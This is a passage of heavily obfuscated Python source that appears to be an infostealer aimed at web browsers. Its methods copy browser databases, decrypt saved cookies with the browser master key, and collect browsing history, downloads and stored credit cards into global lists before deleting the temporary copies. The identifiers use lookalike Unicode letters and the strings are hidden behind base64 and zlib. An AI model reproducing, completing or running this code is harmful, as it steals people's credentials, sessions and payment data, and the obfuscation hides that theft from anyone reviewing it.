or not 𝙧𝘰𝘄[𝘪𝘯𝘵.from_bytes(𝗺𝗮𝗽(lambda O, i: 394 - (𝙞𝘯𝙩(𝘖) + 𝘪), 𝗺𝗮𝙥(__𝙞𝗺𝗽𝘰𝘳𝘁__('base64').b64decode(__𝗶𝗺𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝘱(*[𝗶𝙩𝘦𝘳(__𝙞𝙢𝗽𝗼𝗿𝘁__('base64').b64decode(__𝗶𝙢𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xad\xca\xae\x02\x00\x03\xf6\x01\xad')).decode())] * 3)), 𝘳𝘢𝘯𝙜𝙚(1)), __𝘪𝙢𝘱𝘰𝗿𝙩__('base64').b64decode(__𝙞𝘮𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝙧𝗼𝘸[𝘪𝗻𝙩.from_bytes(𝙢𝗮𝗽(lambda O, i: 305 - (𝙞𝘯𝙩(𝗢) + 𝘪), 𝘮𝗮𝘱(__𝙞𝗺𝘱𝘰𝙧𝘵__('base64').b64decode(__𝙞𝙢𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝙥(*[𝙞𝙩𝙚𝗿(__𝗶𝙢𝘱𝗼𝗿𝘵__('base64').b64decode(__𝗶𝘮𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xadr\xac\x02\x00\x03\xa2\x01\x83')).decode())] * 3)), 𝘳𝗮𝘯𝙜𝙚(1)), __𝙞𝗺𝗽𝗼𝙧𝙩__('base64').b64decode(__𝘪𝘮𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]) or (not 𝘳𝘰𝘄[𝙞𝘯𝘵.from_bytes(𝗺𝙖𝘱(lambda O, i: 553 - (𝗶𝙣𝙩(𝘖) + 𝗶), 𝙢𝙖𝙥(__𝗶𝙢𝗽𝙤𝙧𝘵__('base64').b64decode(__𝙞𝗺𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝘱(*[𝘪𝘵𝗲𝘳(__𝙞𝘮𝘱𝙤𝗿𝘁__('base64').b64decode(__𝘪𝗺𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xf3\x0b\t-\x07\x00\x03Y\x01o')).decode())] * 3)), 𝗿𝗮𝘯𝗴𝘦(1)), __𝗶𝙢𝗽𝙤𝙧𝙩__('base64').b64decode(__𝙞𝘮𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝙘𝗼𝗼𝙠𝘪𝙚 = 𝘀𝘦𝘭𝘧.decrypt_password(𝘳𝗼𝘸[𝘪𝘯𝘁.from_bytes(𝙢𝗮𝙥(lambda O, i: 698 - (𝙞𝙣𝙩(𝘖) + 𝘪), 𝘮𝗮𝘱(__𝘪𝙢𝙥𝘰𝙧𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝘱(*[𝙞𝘁𝙚𝗿(__𝘪𝘮𝙥𝘰𝘳𝘵__('base64').b64decode(__𝙞𝘮𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xcb\xca6\x04\x00\x03\x81\x01U')).decode())] * 3)), 𝙧𝗮𝗻𝘨𝗲(1)), __𝙞𝙢𝗽𝘰𝙧𝘵__('base64').b64decode(__𝙞𝘮𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘀𝙚𝘭𝘧.master_key)
            __𝘾𝘖𝙊𝙆𝗜𝗘𝗦__.append(𝙏𝘺𝙥𝘦𝘀.Cookie(𝙧𝗼𝘄[𝗶𝙣𝘁.from_bytes(𝗺𝘢𝘱(lambda O, i: 832 - (𝗶𝘯𝘵(𝘖) + 𝘪), 𝘮𝙖𝘱(__𝙞𝗺𝘱𝗼𝙧𝘵__('base64').b64decode(__𝗶𝗺𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝙥(*[𝙞𝘵𝙚𝘳(__𝙞𝙢𝗽𝙤𝘳𝘵__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝗮𝙣𝗴𝘦(0)), __𝙞𝙢𝘱𝘰𝘳𝘵__('base64').b64decode(__𝗶𝙢𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝙤𝙬[𝘪𝙣𝘵.from_bytes(𝙢𝘢𝗽(lambda O, i: 364 - (𝘪𝘯𝘁(𝙊) + 𝙞), 𝗺𝙖𝘱(__𝙞𝘮𝘱𝙤𝙧𝘁__('base64').b64decode(__𝙞𝘮𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝙥(*[𝘪𝘵𝘦𝙧(__𝘪𝙢𝘱𝘰𝗿𝘁__('base64').b64decode(__𝗶𝗺𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf3\xad\x8a\xac\x02\x00\x03\xd2\x01\x9b')).decode())] * 3)), 𝗿𝗮𝘯𝗴𝙚(1)), __𝗶𝗺𝘱𝘰𝘳𝘵__('base64').b64decode(__𝙞𝗺𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝗼𝘸[𝗶𝘯𝘵.from_bytes(𝘮𝘢𝙥(lambda O, i: 673 - (𝗶𝙣𝘁(𝗢) + 𝗶), 𝘮𝘢𝘱(__𝙞𝙢𝙥𝙤𝙧𝙩__('base64').b64decode(__𝙞𝘮𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝙥(*[𝙞𝘵𝘦𝗿(__𝙞𝘮𝘱𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xcbJ\xae\x00\x00\x03\xb8\x01\x94')).decode())] * 3)), 𝗿𝗮𝗻𝙜𝙚(1)), __𝙞𝗺𝗽𝙤𝗿𝙩__('base64').b64decode(__𝙞𝗺𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗰𝘰𝘰𝗸𝗶𝙚, 𝙧𝙤𝘸[𝙞𝗻𝘵.from_bytes(𝙢𝗮𝘱(lambda O, i: 619 - (𝙞𝘯𝙩(𝘖) + 𝙞), 𝗺𝘢𝗽(__𝙞𝙢𝙥𝗼𝙧𝘁__('base64').b64decode(__𝙞𝙢𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝙥(*[𝘪𝘁𝙚𝙧(__𝘪𝗺𝗽𝗼𝗿𝘁__('base64').b64decode(__𝗶𝙢𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xda\xf3\xcbr5\x04\x00\x035\x01/')).decode())] * 3)), 𝘳𝙖𝗻𝙜𝗲(1)), __𝘪𝙢𝙥𝗼𝘳𝘵__('base64').b64decode(__𝘪𝗺𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝗰𝗼𝙣𝘯.close()
        𝙤𝘴.remove(__𝗶𝗺𝘱𝗼𝘳𝙩__('base64').b64decode(__𝙞𝗺𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9\x890\n\xca\x04\x00\x18\xcb\x03\xeb')).decode())

    def get_web_history(self, path, profile):
        𝙬𝘦𝗯_𝘩𝘪𝘴𝘵𝙤𝙧𝘺_𝘥𝙗 = __𝗶𝗺𝙥𝘰𝙧𝘁__('base64').b64decode(__𝗶𝘮𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xdaK56LN\x05\xe2`\xf7\x9c\xaa\x14w\xcb\xca\xd4@[[\x00B=\x06f')).decode().format(𝙥𝙖𝘁𝗵, 𝙥𝙧𝘰𝘧𝘪𝘭𝘦)
        if not 𝗼𝘴.path.exists(𝘄𝘦𝘣_𝘩𝘪𝘀𝘵𝗼𝙧𝘆_𝘥𝘣):
            return
        𝙨𝙝𝘂𝘁𝘪𝗹.copy(𝘸𝗲𝙗_𝙝𝘪𝘴𝘁𝘰𝗿𝘺_𝙙𝗯, __𝘪𝙢𝙥𝗼𝙧𝙩__('base64').b64decode(__𝙞𝘮𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK1\n\xcb\x8c0\xca(H6\x0e*K\xce\xcbI\x8br\xf7\xb4\x05\x00HH\x06\xe0')).decode())
        𝙘𝗼𝗻𝘯 = 𝘴𝘲𝘭𝗶𝙩𝗲3.connect(__𝘪𝙢𝙥𝘰𝘳𝙩__('base64').b64decode(__𝗶𝘮𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK1\n\xcb\x8c0\xca(H6\x0e*K\xce\xcbI\x8br\xf7\xb4\x05\x00HH\x06\xe0')).decode())
        𝙘𝘂𝙧𝙨𝗼𝙧 = 𝗰𝘰𝘯𝙣.cursor()
        𝗰𝙪𝙧𝙨𝗼𝗿.execute(__𝗶𝘮𝘱𝙤𝗿𝘵__('base64').b64decode(__𝘪𝗺𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5\xf4\x08\xabLr.OOq\xcf1Hr\x0f-\xf6t\xaf\xc8H6\x0eJK\xc9\xcd\xa9J\x8c\x00\xd2\xee9%Q\xc1N\xee\xa1\xd9\x96~`\xb5\x1e\xbe\xb6\x00q\xa2\x14\x90')).decode())
        for 𝙧𝙤𝙬 in 𝙘𝙪𝙧𝙨𝗼𝙧.fetchall():
            if not 𝗿𝙤𝙬[𝘪𝗻𝙩.from_bytes(𝘮𝙖𝙥(lambda O, i: 434 - (𝗶𝘯𝘵(𝙊) + 𝙞), 𝙢𝙖𝙥(__𝙞𝗺𝗽𝙤𝙧𝙩__('base64').b64decode(__𝘪𝗺𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝙞𝘵𝘦𝗿(__𝗶𝘮𝘱𝘰𝗿𝘁__('base64').b64decode(__𝘪𝘮𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝗮𝙣𝘨𝘦(0)), __𝙞𝙢𝗽𝘰𝙧𝘁__('base64').b64decode(__𝙞𝙢𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝘳𝘰𝙬[𝙞𝗻𝙩.from_bytes(𝗺𝙖𝘱(lambda O, i: 291 - (𝘪𝙣𝘁(𝗢) + 𝘪), 𝘮𝗮𝗽(__𝗶𝙢𝘱𝙤𝘳𝙩__('base64').b64decode(__𝗶𝘮𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝘪𝘁𝘦𝗿(__𝘪𝘮𝗽𝙤𝗿𝘵__('base64').b64decode(__𝙞𝘮𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xcd\xca.\x07\x00\x03\xc3\x01\x9a')).decode())] * 3)), 𝗿𝗮𝙣𝗴𝙚(1)), __𝗶𝙢𝙥𝗼𝗿𝘁__('base64').b64decode(__𝗶𝗺𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝙧𝗼𝙬[𝗶𝙣𝘁.from_bytes(𝗺𝗮𝗽(lambda O, i: 758 - (𝗶𝘯𝘁(𝗢) + 𝙞), 𝘮𝘢𝘱(__𝗶𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝗶𝙢𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝘱(*[𝘪𝘁𝗲𝘳(__𝙞𝘮𝘱𝗼𝙧𝘁__('base64').b64decode(__𝗶𝗺𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xab\n5\x02\x00\x03\x86\x01P')).decode())] * 3)), 𝘳𝙖𝘯𝘨𝗲(1)), __𝘪𝘮𝘱𝘰𝙧𝘁__('base64').b64decode(__𝘪𝗺𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            __𝙒𝗘𝘉_𝘏𝗜𝘚𝘛𝘖𝗥𝘠__.append(𝘛𝘆𝘱𝘦𝘴.WebHistory(𝗿𝙤𝘄[𝙞𝗻𝙩.from_bytes(𝘮𝘢𝙥(lambda O, i: 401 - (𝙞𝘯𝘵(𝙊) + 𝙞), 𝘮𝗮𝗽(__𝘪𝗺𝙥𝙤𝘳𝘁__('base64').b64decode(__𝘪𝗺𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝘱(*[𝙞𝘵𝗲𝗿(__𝘪𝙢𝘱𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝘯𝗴𝘦(0)), __𝗶𝘮𝙥𝗼𝘳𝙩__('base64').b64decode(__𝘪𝙢𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝙤𝘄[𝙞𝙣𝙩.from_bytes(𝙢𝗮𝙥(lambda O, i: 800 - (𝘪𝘯𝙩(𝗢) + 𝙞), 𝘮𝙖𝙥(__𝗶𝘮𝘱𝗼𝙧𝘁__('base64').b64decode(__𝘪𝗺𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝙥(*[𝘪𝙩𝘦𝘳(__𝗶𝙢𝗽𝙤𝗿𝘁__('base64').b64decode(__𝗶𝘮𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xab\xca6\x05\x00\x03\xb5\x01i')).decode())] * 3)), 𝘳𝙖𝗻𝙜𝗲(1)), __𝘪𝗺𝙥𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘳𝗼𝘄[𝘪𝙣𝘵.from_bytes(𝗺𝗮𝗽(lambda O, i: 571 - (𝗶𝙣𝘁(𝘖) + 𝘪), 𝙢𝗮𝗽(__𝗶𝗺𝙥𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝗶𝘁𝗲𝗿(__𝙞𝗺𝘱𝘰𝗿𝘁__('base64').b64decode(__𝘪𝗺𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xda\xf3\x0b\x894\x05\x00\x03\x1f\x011')).decode())] * 3)), 𝗿𝗮𝘯𝗴𝘦(1)), __𝗶𝗺𝘱𝙤𝗿𝘁__('base64').b64decode(__𝗶𝙢𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝘤𝘰𝗻𝘯.close()
        𝗼𝙨.remove(__𝘪𝘮𝙥𝘰𝗿𝙩__('base64').b64decode(__𝘪𝙢𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaK1\n\xcb\x8c0\xca(H6\x0e*K\xce\xcbI\x8br\xf7\xb4\x05\x00HH\x06\xe0')).decode())

    def get_downloads(self, path, profile):
        𝗱𝙤𝙬𝗻𝗹𝙤𝗮𝙙𝙨_𝘥𝘣 = __𝗶𝗺𝙥𝘰𝗿𝙩__('base64').b64decode(__𝗶𝙢𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xdaK56LN\x05\xe2`\xf7\x9c\xaa\x14w\xcb\xca\xd4@[[\x00B=\x06f')).decode().format(𝘱𝙖𝘁𝘩, 𝘱𝙧𝗼𝘧𝗶𝙡𝙚)
        if not 𝗼𝘴.path.exists(𝗱𝙤𝘄𝘯𝗹𝙤𝗮𝘥𝙨_𝗱𝙗):
            return
        𝘴𝙝𝙪𝙩𝘪𝗹.copy(𝘥𝙤𝘸𝗻𝙡𝙤𝗮𝙙𝘀_𝙙𝙗, __𝘪𝘮𝘱𝗼𝘳𝘵__('base64').b64decode(__𝙞𝘮𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())
        𝗰𝘰𝘯𝙣 = 𝙨𝘲𝙡𝗶𝘁𝗲3.connect(__𝙞𝗺𝗽𝗼𝘳𝘵__('base64').b64decode(__𝙞𝘮𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())
        𝘤𝘶𝘳𝘴𝙤𝘳 = 𝘤𝙤𝘯𝙣.cursor()
        𝘤𝙪𝘳𝘴𝘰𝗿.execute(__𝗶𝙢𝙥𝙤𝗿𝘵__('base64').b64decode(__𝘪𝙢𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5\xf4\x08\xca\x88\xcc\xb14L\xce-/\x06\xb1\x93sSrR\xdc,\xcb##\x82\xf2=]\xa3\x82C\x0c\x0c\xd2\xa3\xdc-\x8d\x93r+\xca"\xc3\x83\xaa\x00\x13\xf6\x12\xfa')).decode())
        for 𝗿𝘰𝘸 in 𝙘𝘶𝗿𝘴𝘰𝙧.fetchall():
            if not 𝙧𝙤𝘸[𝙞𝗻𝙩.from_bytes(𝗺𝗮𝘱(lambda O, i: 344 - (𝗶𝙣𝘁(𝙊) + 𝗶), 𝗺𝗮𝗽(__𝗶𝘮𝗽𝙤𝘳𝙩__('base64').b64decode(__𝙞𝘮𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝘱(*[𝘪𝘁𝗲𝘳(__𝗶𝘮𝘱𝙤𝗿𝘁__('base64').b64decode(__𝙞𝙢𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝘢𝙣𝘨𝘦(0)), __𝗶𝙢𝙥𝗼𝗿𝘵__('base64').b64decode(__𝗶𝗺𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝘳𝘰𝙬[𝘪𝙣𝘁.from_bytes(𝗺𝗮𝘱(lambda O, i: 567 - (𝗶𝙣𝙩(𝘖) + 𝙞), 𝙢𝙖𝘱(__𝘪𝘮𝘱𝙤𝗿𝘁__('base64').b64decode(__𝗶𝘮𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝘪𝘵𝙚𝘳(__𝙞𝗺𝘱𝙤𝗿𝘵__('base64').b64decode(__𝗶𝘮𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\xf3\x0b\x894\x02\x00\x03\x1c\x01.')).decode())] * 3)), 𝙧𝙖𝘯𝘨𝗲(1)), __𝙞𝗺𝘱𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]:
                continue
            __𝘋𝗢𝗪𝙉𝗟𝗢𝘼𝘋𝗦__.append(𝙏𝙮𝙥𝙚𝙨.Download(𝙧𝘰𝙬[𝘪𝘯𝘵.from_bytes(𝗺𝘢𝗽(lambda O, i: 774 - (𝙞𝙣𝘁(𝘖) + 𝘪), 𝗺𝙖𝗽(__𝘪𝘮𝙥𝗼𝘳𝘵__('base64').b64decode(__𝙞𝗺𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝙥(*[𝙞𝙩𝘦𝙧(__𝙞𝘮𝙥𝘰𝗿𝘁__('base64').b64decode(__𝗶𝗺𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝘢𝘯𝗴𝗲(0)), __𝙞𝙢𝘱𝘰𝘳𝘵__('base64').b64decode(__𝘪𝗺𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘳𝘰𝙬[𝗶𝙣𝙩.from_bytes(𝘮𝘢𝙥(lambda O, i: 492 - (𝙞𝗻𝙩(𝗢) + 𝗶), 𝙢𝘢𝘱(__𝗶𝘮𝙥𝗼𝙧𝙩__('base64').b64decode(__𝗶𝗺𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝙥(*[𝗶𝘵𝙚𝘳(__𝙞𝙢𝗽𝘰𝗿𝙩__('base64').b64decode(__𝙞𝙢𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf3s\xc9\xae\x00\x00\x03V\x01v')).decode())] * 3)), 𝘳𝗮𝙣𝗴𝘦(1)), __𝙞𝗺𝗽𝙤𝘳𝙩__('base64').b64decode(__𝗶𝘮𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝙘𝗼𝙣𝘯.close()
        𝘰𝙨.remove(__𝗶𝘮𝙥𝙤𝗿𝙩__('base64').b64decode(__𝗶𝘮𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())

    def get_credit_cards(self, path, profile):
        𝙘𝙖𝗿𝗱𝘀_𝘥𝘣 = __𝗶𝗺𝘱𝘰𝗿𝙩__('base64').b64decode(__𝙞𝗺𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xdaK56LN\x05\xe20\xa3\xb0LO\xd7\xa0\x8c\x14wW[\x00?N\x06\x15')).decode().format(𝘱𝙖𝘁𝘩, 𝗽𝗿𝙤𝙛𝘪𝙡𝙚)
        if not 𝗼𝙨.path.exists(𝙘𝗮𝙧𝙙𝘀_𝘥𝗯):
            return
        𝘴𝙝𝙪𝘁𝘪𝙡.copy(𝘤𝗮𝗿𝙙𝘴_𝗱𝘣, __𝗶𝙢𝘱𝙤𝗿𝙩__('base64').b64decode(__𝗶𝗺𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())
        𝙘𝗼𝘯𝗻 = 𝘀𝘲𝙡𝙞𝘵𝘦3.connect(__𝗶𝙢𝙥𝘰𝘳𝘁__('base64').b64decode(__𝙞𝗺𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())
        𝗰𝘂𝘳𝘀𝘰𝙧 = 𝙘𝗼𝘯𝗻.cursor()
        𝙘𝙪𝗿𝙨𝘰𝙧.execute(__𝗶𝙢𝙥𝗼𝙧𝙩__('base64').b64decode(__𝙞𝘮𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xdae\x8dA\x0b\xc2 \x18\x86\xff\x92\t\x1e<t\xd9`6i\xa3,\xf5\x9b7]\xdbd~\x83\xa0h\xf8\xef\x13:v}\xde\x87\xf7\xd1\xc4tJ\xf7\xba\x15,\x06k\xe6@\xd9<\xd0&\xbbz_\x1c\xc4\xdd\x83\x8c\x0f\x81\x9f\x80\xfc]6\xe2\xff9s\xb6\xc9\xe7\xbaZ\x07\x90\t(;\x04+qD\x8ea\xeb\xf3\x04\x15q\xf6\xfaj\x85*~\xf9\xb7<y\xeb\x9e\x85-\n\xe5\xe5~\xab\xd6q3\xc9\x83\xfauO\xdd\xf1\x0b\xa1_2\x87')).decode())
        for 𝗿𝗼𝘸 in 𝘤𝙪𝗿𝘴𝗼𝗿.fetchall():
            if not 𝗿𝘰𝘄[𝙞𝘯𝘁.from_bytes(𝗺𝗮𝙥(lambda O, i: 911 - (𝗶𝘯𝙩(𝘖) + 𝘪), 𝗺𝗮𝗽(__𝘪𝗺𝗽𝙤𝘳𝘁__('base64').b64decode(__𝘪𝗺𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝙥(*[𝙞𝘁𝙚𝘳(__𝘪𝗺𝙥𝙤𝘳𝘵__('base64').b64decode(__𝗶𝘮𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝗮𝙣𝙜𝙚(0)), __𝙞𝘮𝙥𝗼𝙧𝘁__('base64').b64decode(__𝙞𝗺𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝗿𝘰𝘸[𝘪𝘯𝘵.from_bytes(𝗺𝙖𝙥(lambda O, i: 424 - (𝗶𝗻𝙩(𝙊) + 𝙞), 𝗺𝘢𝘱(__𝙞𝗺𝗽𝙤𝙧𝘁__('base64').b64decode(__𝗶𝙢𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝘱(*[𝙞𝘁𝗲𝙧(__𝗶𝙢𝘱𝘰𝘳𝘁__('base64').b64decode(__𝗶𝗺𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\xf3s\xf1\xac\x02\x00\x03\x14\x01V')).decode())] * 3)), 𝗿𝙖𝗻𝙜𝘦(1)), __𝗶𝗺𝙥𝘰𝘳𝙩__('base64').b64decode(__𝘪𝘮𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝙧𝗼𝘄[𝗶𝙣𝘵.from_bytes(𝙢𝗮𝗽(lambda O, i: 684 - (𝘪𝗻𝙩(𝙊) + 𝘪), 𝗺𝙖𝗽(__𝙞𝗺𝗽𝘰𝘳𝙩__('base64').b64decode(__𝙞𝗺𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝙥(*[𝗶𝙩𝘦𝘳(__𝗶𝗺𝗽𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xda\xf3\xcbJ\xaf\x04\x00\x03\xc1\x01\x99')).decode())] * 3)), 𝙧𝘢𝙣𝗴𝘦(1)), __𝘪𝙢𝗽𝗼𝘳𝙩__('base64').b64decode(__𝗶𝙢𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]) or (not 𝙧𝗼𝘸[𝘪𝙣𝘁.from_bytes(𝘮𝗮𝘱(lambda O, i: 709 - (𝘪𝘯𝙩(𝘖) + 𝗶), 𝙢𝗮𝗽(__𝘪𝗺𝗽𝗼𝘳𝘵__('base64').b64decode(__𝙞𝘮𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝙥(*[𝘪𝘵𝙚𝘳(__𝙞𝗺𝘱𝘰𝗿𝘁__('base64').b64decode(__𝘪𝗺𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xabr4\x02\x00\x03^\x01<')).decode())] * 3)), 